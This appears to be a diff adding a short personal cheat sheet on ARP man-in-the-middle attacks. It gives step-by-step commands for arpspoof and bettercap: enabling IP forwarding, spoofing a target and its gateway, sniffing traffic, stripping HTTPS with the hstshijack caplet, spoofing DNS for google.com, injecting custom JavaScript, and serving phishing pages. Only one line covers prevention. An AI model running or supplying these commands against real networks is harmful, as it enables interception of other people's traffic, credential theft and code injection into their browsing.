@@ -1,0 +1,68 @@
+For ARP Man in middle attack 
+Use linux tool called arpspoof, wireshark, netdiscover 
+
+---------------------------------------------------------------
+Way 1
+
+Enable Ipv4 portforwording 
+sudo su -
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+discover your target do spoofing
+netdiscover sudo netdiscover -r <ip_range>
+
+Spoofing cmds
+sudo arpspoof -i <interface> -t <target_machine> <gateway_ip>
+sudo arpspoof -i <interface> -t <gateway_ip> <target_machine> 
+example,
+sudo arpspoof -i wlp6s0 -t 192.168.1.3 192.168.1.1
+sudo arpspoof -i wlp6s0 -t 192.168.1.3 192.168.1.1
+
+Analyiz Packet using wireshark tool and filters
+---------------------------------------------------------------------------------------
+Way 2 
+using linux tool bettercap
+
+Enable Ipv4 portforwording 
+sudo su -
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+start bettercap cmds
+bettercap
+help 
+net.probe on -> module to discover devices connected to network
+net.show ->  to list devices connected to network
+set arp.spoof.fullduplex true -> to set two way communication
+set arp.spoof.targets 192.168.1.5 -> To set target
+arp.spoof on -> module for arp spoofing 
+net.sniff on -> to show network Packet comming from target
+-------------
+Bypass https
+net.sniff.local true -> to see traffic from local machine (used for by pass https)
+caplets.show -> show all caplets
+hstshijack/hstshijack -> https to http redirect (by pass https)
+-----------
+For websites which browser does https use dns spoof in hstshijack.cap with replecement
+use pishing kind of pages
+-----------
+For DNS spoofing
+set.dns.spoof.domains google.com,*google.com 
+dns.spoof on
+------------
+For javascript payload ijection
+add custom js script at hstshijack.cap file
+
+----------------------------------------------------------------------------------------
+
+
+Prevention 
+use vpn, https everywhere
+
+
+
+
+
+
+
+
+
